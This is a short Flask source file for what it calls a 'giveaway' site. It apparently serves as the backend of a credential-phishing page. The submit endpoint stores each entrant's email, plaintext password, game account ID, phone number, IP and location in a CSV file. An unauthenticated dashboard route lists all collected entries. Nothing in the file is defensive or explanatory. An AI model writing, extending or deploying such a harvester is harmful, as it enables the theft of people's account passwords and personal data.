from flask import Flask, request, jsonify, render_template
import csv
from datetime import datetime
import os
import uuid

app = Flask(__name__)

CSV_FILE = 'giveaway_entries.csv'

# Ensure CSV file exists with headers
if not os.path.exists(CSV_FILE):
    with open(CSV_FILE, 'w', newline='') as f:
        writer = csv.writer(f)
        writer.writerow([
            'id', 'email', 'password', 'game_id', 'phone', 
            'ip', 'location', 'timestamp'
        ])

@app.route('/api/submit', methods=['POST'])
def submit():
    try:
        data = request.json
        
        # Generate unique ID
        entry_id = str(uuid.uuid4())
        
        # Prepare data for CSV
        entry = [
            entry_id,
            data['email'],
            data['password'],
            data['id'],
            data['phone'],
            data.get('ip', 'Unknown'),
            data.get('location', 'Unknown'),
            datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        ]
        
        # Append to CSV
        with open(CSV_FILE, 'a', newline='') as f:
            writer = csv.writer(f)
            writer.writerow(entry)
        
        return jsonify({'success': True, 'id': entry_id})
    
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)}), 500

@app.route('/dashboard')
def dashboard():
    entries = []
    with open(CSV_FILE, 'r') as f:
        reader = csv.DictReader(f)
        for row in reader:
            entries.append(row)
    
    # Sort by newest first
    entries.reverse()
    
    return render_template('dashboard.html', entries=entries)

if __name__ == '__main__':
    app.run(debug=True)
